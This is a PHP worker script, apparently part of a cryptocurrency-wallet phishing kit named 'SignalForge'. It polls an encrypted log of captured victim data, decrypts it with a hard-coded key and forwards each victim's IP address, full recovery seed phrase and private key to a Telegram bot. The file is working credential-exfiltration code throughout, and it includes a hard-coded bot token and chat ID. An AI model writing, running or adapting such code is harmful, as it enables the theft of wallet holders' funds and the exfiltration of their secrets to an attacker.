<?php
/**
 * telegram_sender.php — Background worker that polls for new captures and sends Telegram alerts
 * Reads captures.log and forwards any new entries to Telegram with the FULL seed phrase.
 */

$TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
$TELEGRAM_CHAT_ID   = getenv('TELEGRAM_CHAT_ID')   ?: '6964954278';
$ENCRYPTION_KEY     = 'SignalForge_Render_2026_Secret!!';
$ENCRYPTION_IV      = '1234567890abcdef';
$LOG_FILE           = __DIR__ . '/logs/captures.log';
$STATE_FILE         = __DIR__ . '/logs/.last_sent';

function sendTelegram($record) {
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $wordCount = $record['seedWordCount'] ?? 0;
    $hasSeed = !empty($record['seed']);
    $hasKey = !empty($record['pkey']);

    $message = "🚨 **SignalForge — New Capture** 🚨\n\n";
    $message .= "📅 Time: {$record['capturedAt']}\n";
    $message .= "🌐 IP: `{$record['ip']}`\n";
    $message .= "📝 Seed: " . ($hasSeed ? "✅ $wordCount words" : "❌ None") . "\n";
    $message .= "🔑 Private Key: " . ($hasKey ? "✅ Captured" : "❌ None") . "\n";

    // Send FULL seed phrase — no truncation
    if ($hasSeed) {
        $message .= "\n📄 **Full Recovery Phrase:**\n`{$record['seed']}`\n";
    }
    if ($hasKey) {
        $message .= "\n🔐 **Full Private Key:**\n`{$record['pkey']}`\n";
    }

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'chat_id' => $TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}

// Load last sent ID
$lastSent = 0;
if (file_exists($STATE_FILE)) {
    $lastSent = (int)file_get_contents($STATE_FILE);
}

echo "[SignalForge Telegram Sender] Started. Polling every 10 seconds.\n";
$failCount = 0;

while (true) {
    if (file_exists($LOG_FILE)) {
        $lines = file($LOG_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $totalLines = count($lines);
        
        if ($totalLines > $lastSent) {
            for ($i = $lastSent; $i < $totalLines; $i++) {
                $decoded = base64_decode(trim($lines[$i]));
                $decrypted = openssl_decrypt($decoded, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
                if ($decrypted) {
                    $record = json_decode($decrypted, true);
                    if ($record && isset($record['id'])) {
                        if (sendTelegram($record)) {
                            echo "[SENT #$i] {$record['id']}\n";
                            $lastSent = $i + 1;
                            file_put_contents($STATE_FILE, $lastSent);
                            $failCount = 0;
                        } else {
                            $failCount++;
                            echo "[FAIL #$i] {$record['id']} (attempt $failCount)\n";
                            if ($failCount > 5) {
                                echo "[FATAL] Too many failures. Waiting 60s...\n";
                                sleep(60);
                                $failCount = 0;
                            }
                        }
                    }
                }
            }
        }
    }
    sleep(10);
}
